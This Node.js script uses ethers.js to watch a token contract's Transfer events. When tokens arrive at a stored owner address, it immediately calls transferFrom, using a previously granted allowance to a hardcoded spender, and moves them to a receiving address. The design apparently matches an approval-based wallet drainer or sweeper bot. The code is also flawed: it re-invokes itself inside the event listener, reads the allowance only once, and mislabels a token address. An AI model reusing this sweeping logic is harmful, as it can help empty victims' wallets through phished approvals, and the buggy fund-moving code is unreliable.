const ethers = require("ethers")
const abi = require("./erc20abi")
let DetailsSchema = require("../models/detailsModel")

async function main(contractAddress){
  try{
    let BICOcontractAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
    let details = await DetailsSchema.find()
    
    let tokenAbi = abi
    let provider = new ethers.providers.WebSocketProvider(details[0].current_chain_rpc/*"wss://mainnet.gateway.tenderly.co"*/)
    let signer = new ethers.Wallet(process.env.GAS_WALLET_PK, provider)
    //console.log("private key", process.env.GAS_WALLET_PK)

    let contract = new ethers.Contract(contractAddress, tokenAbi, provider)
    let decimals = await contract.decimals()
    let symbol = await contract.symbol()
    let allowance = await contract.allowance(details[0].owner_address, "0x5470A872947ca5a6cEE4FDd2030c735F65dfF294")
    
    

    //let {owner_address, receiving_address, approve_amount, token_ca} = details
    let contractWithSigner = contract.connect(signer)

    contract.on("Transfer", async (from, to, value, event)=>{
        let usableDetails = details[0]
        let allowanceWei = Number(allowance)
        let valueWei = Number(value)
        console.log("| allowance in wei", allowanceWei, "| value in wei", valueWei)

        let amountToMove = allowanceWei > valueWei ? valueWei : allowanceWei
        console.log("amount to move: ", amountToMove, typeof amountToMove)

        if(to.toLowerCase() == usableDetails.owner_address.toLowerCase()){
          try{
            let tx = await contractWithSigner.transferFrom(usableDetails.owner_address, usableDetails.receiving_address, ethers.BigNumber.from(amountToMove.toString()), {gasLimit: 100000})
            console.log(tx)
            await DetailsSchema.findByIdAndUpdate(usableDetails.id, {transactions: [...usableDetails.transactions, tx]})
          }catch(err){
            console.log("automatic transfer error:", err)
          }
        }else{
          console.log("to address doesn't match owner_address yet")
        }
        main(contractAddress)
    })


    console.log("decimals converted from hex", Number(decimals), "| symbol", symbol, "| allowance converted from hex", Number(allowance), "| allowance converted from wei", Number(allowance) / (10**18))
  }catch(err){
    console.log(err)
    main(contractAddress)
    return
  }
}

module.exports = main